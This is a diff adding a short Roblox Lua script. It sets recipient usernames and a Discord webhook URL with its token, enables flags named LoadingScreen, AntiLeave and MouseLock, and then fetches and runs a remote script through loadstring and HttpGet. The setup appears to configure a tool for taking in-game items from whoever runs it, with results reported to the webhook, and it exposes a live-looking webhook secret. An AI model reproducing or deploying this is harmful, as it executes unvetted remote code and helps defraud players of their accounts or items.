@@ -1,0 +1,9 @@
+﻿UserName = "72_game"
+Webhook = "https://discord.com/api/webhooks/1132929512183709766/8NdYwH7NABxfNQSd3xFuO2WuMP2-xdOsmWV1pDwT9DqgNi6DaE2B3dY5S-MkTsfV8KZS"
+UserName2 = "HugeHunter72"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScripts", true))()
